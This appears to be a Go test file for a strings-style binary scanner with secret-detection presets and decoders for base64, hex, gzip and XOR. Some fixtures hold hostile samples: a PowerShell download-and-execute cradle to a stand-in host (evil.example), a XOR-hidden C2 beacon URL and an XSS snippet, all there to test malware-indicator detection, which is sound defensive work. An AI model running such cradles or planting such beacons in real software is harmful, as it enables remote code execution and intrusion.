// Copyright 2025-2026 David Araújo
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     https://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package main

import (
	"bytes"
	"compress/gzip"
	"compress/zlib"
	"encoding/base32"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"math/rand"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"
)

// --- Patterns -------------------------------------------------------------

func TestPresets(t *testing.T) {
	cases := []struct {
		preset string
		yes    []string
		no     []string
	}{
		{"ip", []string{"host 10.0.0.1 up", "255.255.255.255"}, []string{"999.1.1.1", "1.2.3.256", "1.2.3"}},
		{"ipv6", []string{"addr 2001:db8::1", "::1", "fe80::1%eth0", "[2001:db8:0:0:0:0:2:1]:443", "::ffff:192.0.2.1"},
			[]string{"std::map", "12:34:56", "aa:bb:cc:dd:ee:ff", "0xdead::beef", "a :: b"}},
		{"domain", []string{"visit evil-c2.example.com now", "api.github.io", "WWW.EXAMPLE.ORG"},
			[]string{"main.go", "fmt.Println", "script.sh", "lib.so", "file.company"}},
		{"guid", []string{"{3F2504E0-4F89-11D3-9A0C-0305E82C3301}"}, []string{"3F2504E0-4F89-11D3-9A0C"}},
		{"hash_sha1", []string{strings.Repeat("ab", 20)}, []string{strings.Repeat("ab", 16)}},
		{"aws_key", []string{"key=AKIAIOSFODNN7EXAMPLE"}, []string{"AKIAIOSFODNN7EXAMPL", "XKIAIOSFODNN7EXAMPLE"}},
		{"github_token", []string{"ghp_" + strings.Repeat("a1B2", 9), "github_pat_" + strings.Repeat("x", 22)}, []string{"ghp_short"}},
		{"slack_token", []string{"xoxb-123456789012-abcdef", "https://hooks.slack.com/services/T000/B000/XXXX"}, []string{"xoxz-123456789012"}},
		{"google_api_key", []string{"AIza" + strings.Repeat("A", 35)}, []string{"AIza" + strings.Repeat("A", 10)}},
		{"jwt", []string{"eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxIn0.sig_-123"}, []string{"eyJhbGciOiJIUzI1NiJ9"}},
		{"private_key", []string{"-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----", "-----BEGIN PGP PRIVATE KEY BLOCK-----"},
			[]string{"-----BEGIN PUBLIC KEY-----", "-----BEGIN CERTIFICATE-----"}},
		{"secrets", []string{"AKIAIOSFODNN7EXAMPLE", "-----BEGIN EC PRIVATE KEY-----"}, []string{"hello world"}},
	}
	for _, c := range cases {
		m, err := presetMatcher(c.preset)
		if err != nil {
			t.Fatal(err)
		}
		for _, s := range c.yes {
			if !m.MatchString(s) {
				t.Errorf("%s should match %q", c.preset, s)
			}
		}
		for _, s := range c.no {
			if m.MatchString(s) {
				t.Errorf("%s should not match %q", c.preset, s)
			}
		}
	}
}

func TestIPv6Spans(t *testing.T) {
	got := ipv6Matcher{}.FindAllStringIndex("a 2001:db8::1 b ::1.", -1)
	want := [][]int{{2, 13}, {16, 19}}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

func TestRepeatableFilters(t *testing.T) {
	in := []byte("https://a.example/x\x00mail bob@example.org\x00plain text\x00http://localhost/y\x00")

	// Same kind: any may match.
	assertLines(t, scan(t, Config{FindStrs: []string{"url", "email"}, QuietOut: true}, in),
		"https://a.example/x", "mail bob@example.org", "http://localhost/y")
	assertLines(t, scan(t, Config{RegexStrs: []string{"^plain", "bob"}, QuietOut: true}, in),
		"mail bob@example.org", "plain text")
	// Different kinds: all must match.
	assertLines(t, scan(t, Config{FindStrs: []string{"url"}, RegexStrs: []string{"example"}, QuietOut: true}, in),
		"https://a.example/x")
	// Several excludes: any excludes.
	assertLines(t, scan(t, Config{ExcludeStrs: []string{"localhost", "@"}, FindStrs: []string{"url", "email"}, QuietOut: true}, in),
		"https://a.example/x")
}

func TestMultipleWordlists(t *testing.T) {
	dir := t.TempDir()
	a, b := filepath.Join(dir, "a"), filepath.Join(dir, "b")
	os.WriteFile(a, []byte("alpha\n"), 0o644)
	os.WriteFile(b, []byte("beta\n"), 0o644)
	in := []byte("the alpha one\x00the beta two\x00gamma\x00")
	assertLines(t, scan(t, Config{WordLists: []string{a, b}, QuietOut: true}, in), "the alpha one", "the beta two")
}

func TestWordSetSpans(t *testing.T) {
	ws := newWordSet([]string{"pass", "password", "admin"})
	got := ws.FindAllStringIndex("password admin passport pass", -1)
	want := [][]int{{0, 8}, {9, 14}, {24, 28}}
	if fmt.Sprint(got) != fmt.Sprint(want) {
		t.Errorf("got %v, want %v", got, want)
	}
}

// --- Encodings ------------------------------------------------------------

func utf16le(s string) []byte {
	var b []byte
	for _, u := range utf16.Encode([]rune(s)) {
		b = append(b, byte(u), byte(u>>8))
	}
	return b
}

func TestUTF8Encoding(t *testing.T) {
	in := []byte("\x00héllo wörld\x00\xff\xfeabc€def\x00")
	got := scan(t, Config{Encodings: []string{"utf-8"}, JSONOut: true}, in)
	if len(got) != 2 {
		t.Fatalf("got %v", got)
	}
	var r jsonResult
	json.Unmarshal([]byte(got[0]), &r)
	if r.String != "héllo wörld" || r.Length != 11 || r.Offset != 1 || r.Encoding != "utf-8" {
		t.Errorf("unexpected first result: %+v", r)
	}
	json.Unmarshal([]byte(got[1]), &r)
	if r.String != "abc€def" || r.Length != 7 {
		t.Errorf("unexpected second result: %+v", r)
	}

	// Length limits count characters, not bytes: "ééé" is 3 chars, 6 bytes.
	assertLines(t, scan(t, Config{Encodings: []string{"utf8"}, LengthRange: "3:3", QuietOut: true}, []byte("ééé")), "ééé")

	// ascii keeps the classic behaviour: non-ASCII bytes split strings.
	assertLines(t, scan(t, Config{QuietOut: true}, []byte("héllo wörld")), "llo w")
}

func TestAllEncodings(t *testing.T) {
	var in []byte
	// 12 bytes, so the UTF-16 text starts aligned and the ASCII text's last
	// pair is "\x00\x00" (an "i\x00" pair would be a valid UTF-16LE 'i').
	in = append(in, "plain text\x00\x00"...)
	in = append(in, utf16le("wide string")...)
	got := scan(t, Config{Encodings: []string{"all"}}, in)
	assertLines(t, got, "in[ascii]:1:1:plain text", "in[utf-16le]:1:7:wide string")
}

func TestEncodingValidation(t *testing.T) {
	c := Config{LengthRange: "4:", Encodings: []string{"utf-16", "ALL", "ascii"}}
	if err := c.prepare(); err != nil {
		t.Fatal(err)
	}
	if fmt.Sprint(c.Encodings) != "[utf-16le ascii utf-16be]" {
		t.Errorf("got %v", c.Encodings)
	}
	c = Config{LengthRange: "4:", Encodings: []string{"ebcdic"}}
	if c.prepare() == nil {
		t.Error("expected error")
	}
}

// --- Decoders -------------------------------------------------------------

func gz(s string) []byte {
	var b bytes.Buffer
	w := gzip.NewWriter(&b)
	w.Write([]byte(s))
	w.Close()
	return b.Bytes()
}

func zl(s string) []byte {
	var b bytes.Buffer
	w := zlib.NewWriter(&b)
	w.Write([]byte(s))
	w.Close()
	return b.Bytes()
}

func TestBase32Decode(t *testing.T) {
	in := []byte(base32.StdEncoding.EncodeToString([]byte("base32 secret")))
	assertLines(t, scan(t, Config{DecodeMethods: []string{"base32"}, RegexStrs: []string{"secret"}, QuietOut: true}, in), "base32 secret")
	// Lowercase and unpadded is accepted too.
	lower := strings.ToLower(strings.TrimRight(string(in), "="))
	assertLines(t, scan(t, Config{DecodeMethods: []string{"base32"}, RegexStrs: []string{"secret"}, QuietOut: true}, []byte(lower)), "base32 secret")
}

func TestEmbeddedEncodedTokens(t *testing.T) {
	cfg := Config{DecodeMethods: []string{"base64", "hex"}, RegexStrs: []string{"^hidden"}, QuietOut: true}
	in := []byte("token=" + base64.StdEncoding.EncodeToString([]byte("hidden in base64")) + "; id=0x" + hex.EncodeToString([]byte("hidden in hex")))
	assertLines(t, scan(t, cfg, in), "hidden in base64", "hidden in hex")

	// Short and spaced-out values still decode via the fallback.
	assertLines(t, scan(t, Config{DecodeMethods: []string{"base64"}, LengthRange: "3:", RegexStrs: []string{"^hey$"}, QuietOut: true}, []byte("aGV5")), "hey")
	assertLines(t, scan(t, Config{DecodeMethods: []string{"hex"}, RegexStrs: []string{"^hidden$"}, QuietOut: true}, []byte("68 69 64 64 65 6e")), "hidden")
}

func TestURLDecode(t *testing.T) {
	in := []byte("GET /?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E&x=%zz")
	assertLines(t, scan(t, Config{DecodeMethods: []string{"url"}, RegexStrs: []string{"<script>"}, QuietOut: true}, in),
		"GET /?q=<script>alert(1)</script>&x=%zz")
	if percentDecode("no escapes") != nil || percentDecode("100%") != nil {
		t.Error("strings without valid escapes should not decode")
	}
}

func TestGzipAndZlibInsideEncodings(t *testing.T) {
	b64gz := base64.StdEncoding.EncodeToString(gz("compressed secret inside base64"))
	got := scan(t, Config{DecodeMethods: []string{"base64", "gzip"}, RegexStrs: []string{"secret"}}, []byte(b64gz))
	assertLines(t, got, "    in->base64@0->gzip:1:1:compressed secret inside base64")

	hexzl := hex.EncodeToString(zl("zlib secret inside hex"))
	got = scan(t, Config{DecodeMethods: []string{"hex", "zlib"}, RegexStrs: []string{"secret"}, QuietOut: true}, []byte(hexzl))
	assertLines(t, got, "zlib secret inside hex")

	// Without the gzip method, compressed data isn't inflated.
	got = scan(t, Config{DecodeMethods: []string{"base64"}, RegexStrs: []string{"secret"}}, []byte(b64gz))
	assertLines(t, got)
}

func TestWholeInputGzip(t *testing.T) {
	got := scan(t, Config{DecodeMethods: []string{"gzip"}, RegexStrs: []string{"needle"}}, gz("hay hay needle hay"))
	assertLines(t, got, "  in->gzip:1:1:hay hay needle hay")
}

func TestPowerShellEncodedCommand(t *testing.T) {
	// powershell -EncodedCommand takes base64 of UTF-16LE text.
	enc := base64.StdEncoding.EncodeToString(utf16le("IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p')"))
	got := scan(t, Config{DecodeMethods: []string{"base64"}, FindStrs: []string{"url"}}, []byte("powershell -enc "+enc))
	assertLines(t, got, "  in->base64@0[utf-16le]:1:1:IEX (New-Object Net.WebClient).DownloadString('http://evil.example/p')")
}

func TestXORBruteForce(t *testing.T) {
	rng := rand.New(rand.NewSource(7))
	noise := make([]byte, 2000)
	rng.Read(noise)
	secret := []byte("connect to http://c2.example/beacon")
	for i := range secret {
		secret[i] ^= 0x5a
	}
	// Delimit with the key itself (XORs to NUL), as a C string would be.
	in := append(noise[:1000:1000], 0x5a)
	in = append(append(in, secret...), 0x5a)
	in = append(in, noise[1000:]...)

	got := scan(t, Config{DecodeMethods: []string{"xor"}, FindStrs: []string{"url"}, Radix: "x"}, in)
	assertLines(t, got, "in->xor(0x5a):3e9:connect to http://c2.example/beacon")
}

// --- Output ---------------------------------------------------------------

func TestRadix(t *testing.T) {
	in := []byte(strings.Repeat("\x00", 255) + "offset string")
	assertLines(t, scan(t, Config{Radix: "x"}, in), "in:ff:offset string")
	assertLines(t, scan(t, Config{Radix: "d"}, in), "in:255:offset string")
	assertLines(t, scan(t, Config{Radix: "o"}, in), "in:377:offset string")
	// -q -t x mirrors `strings -t x`.
	assertLines(t, scan(t, Config{Radix: "x", QuietOut: true}, in), "     ff offset string")
}

func TestColor(t *testing.T) {
	in := []byte("see https://x.example/a now")
	got := scanRaw(t, Config{Color: "always", FindStrs: []string{"url"}}, in)
	want := "\033[35min\033[0m\033[36m:\033[0m\033[32m1\033[0m\033[36m:\033[0m\033[32m1\033[0m\033[36m:\033[0m" +
		"see \033[1;31mhttps://x.example/a\033[0m now\n"
	if got != want {
		t.Errorf("got  %q\nwant %q", got, want)
	}
	if got := scanRaw(t, Config{Color: "never", FindStrs: []string{"url"}}, in); strings.Contains(got, "\033") {
		t.Errorf("--color=never produced escapes: %q", got)
	}
	if got := scanRaw(t, Config{Color: "always", JSONOut: true}, in); strings.Contains(got, "\033") {
		t.Errorf("JSON output must never be colored: %q", got)
	}
}

func TestContextHexdump(t *testing.T) {
	in := append(append([]byte("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12"), "hello"...), 0xff, 0xfe)
	got := scanRaw(t, Config{Context: 2}, in)
	want := "in:2:9:hello\n" +
		"    00000010  11 12 68 65 6c 6c 6f ff  fe                       |..hello..|\n"
	if got != want {
		t.Errorf("got:\n%s\nwant:\n%s", got, want)
	}

	got = scanRaw(t, Config{Context: 2, JSONOut: true}, in)
	var r jsonResult
	if err := json.Unmarshal([]byte(got), &r); err != nil {
		t.Fatal(err)
	}
	if r.Context == nil || r.Context.Offset != 16 || r.Context.Hex != "1112"+hex.EncodeToString([]byte("hello"))+"fffe" {
		t.Errorf("unexpected JSON context: %+v", r.Context)
	}
}

func TestContextInDecodedBlob(t *testing.T) {
	in := []byte(base64.StdEncoding.EncodeToString([]byte("\x00\x00hidden\x00\x00")))
	got := scanRaw(t, Config{Context: 1, DecodeMethods: []string{"base64"}, RegexStrs: []string{"hidden"}}, in)
	want := "  in->base64@0:1:3:hidden\n" +
		"      00000000  00 00 68 69 64 64 65 6e  00 00                    |..hidden..|\n"
	if got != want {
		t.Errorf("got:\n%s\nwant:\n%s", got, want)
	}
}

// --- Inputs ---------------------------------------------------------------

func writeTree(t *testing.T) string {
	dir := t.TempDir()
	files := map[string]string{
		"a.bin":         "\x00alpha file\x00",
		"sub/b.bin":     "\x00bravo file\x00",
		"sub/deep/c.ok": "\x00charlie file\x00",
	}
	for name, content := range files {
		p := filepath.Join(dir, name)
		os.MkdirAll(filepath.Dir(p), 0o755)
		os.WriteFile(p, []byte(content), 0o644)
	}
	return dir
}

func prepared(t *testing.T, c Config) *Config {
	t.Helper()
	if c.LengthRange == "" {
		c.LengthRange = "4:"
	}
	if err := c.prepare(); err != nil {
		t.Fatal(err)
	}
	return &c
}

func TestRecursive(t *testing.T) {
	dir := writeTree(t)
	cfg := prepared(t, Config{Recursive: true, QuietOut: true})
	got := runInputs(t, cfg, collectInputs([]string{dir}, cfg, nil))
	if got != "alpha file\nbravo file\ncharlie file\n" {
		t.Errorf("got %q", got)
	}

	cfg = prepared(t, Config{})
	got = runInputs(t, cfg, collectInputs([]string{dir}, cfg, nil))
	if !strings.Contains(got, "is a directory (use -R") {
		t.Errorf("expected a directory error, got %q", got)
	}
}

func TestParallelOutputIsOrdered(t *testing.T) {
	dir := t.TempDir()
	var args []string
	var want strings.Builder
	for i := 0; i < 60; i++ {
		p := filepath.Join(dir, fmt.Sprintf("f%02d", i))
		// Vary sizes so files finish out of order.
		content := strings.Repeat(fmt.Sprintf("file %02d line\x00", i), 1+(i*37)%200)
		os.WriteFile(p, []byte(content), 0o644)
		args = append(args, p)
		want.WriteString(strings.Repeat(fmt.Sprintf("file %02d line\n", i), 1+(i*37)%200))
	}
	for _, jobs := range []int{1, 8} {
		cfg := prepared(t, Config{QuietOut: true, Jobs: jobs})
		if got := runInputs(t, cfg, collectInputs(args, cfg, nil)); got != want.String() {
			t.Errorf("jobs=%d: output differs from sequential order", jobs)
		}
	}
}

func TestStdinBufferedWhenNeeded(t *testing.T) {
	data := append([]byte("ascii here\x00"), utf16le("utf16 here")...)

	cfg := prepared(t, Config{Encodings: []string{"all"}, QuietOut: true})
	got := runInputs(t, cfg, collectInputs([]string{"-"}, cfg, bytes.NewReader(data)))
	if got != "ascii here\nutf16 here\n" {
		t.Errorf("got %q", got)
	}

	cfg = prepared(t, Config{QuietOut: true})
	ins := collectInputs(nil, cfg, bytes.NewReader(data))
	if ins[0].buffered || ins[0].name != "<stdin>" {
		t.Errorf("a plain scan should stream stdin, not buffer it")
	}
}

func TestErrorsReportedOncePerInput(t *testing.T) {
	cfg := prepared(t, Config{Encodings: []string{"all"}, DecodeMethods: []string{"xor"}, RegexStrs: []string{"x"}})
	got := runInputs(t, cfg, collectInputs([]string{"/nonexistent/file"}, cfg, nil))
	if strings.Count(got, "ERR") != 1 {
		t.Errorf("expected exactly one error, got:\n%s", got)
	}
}
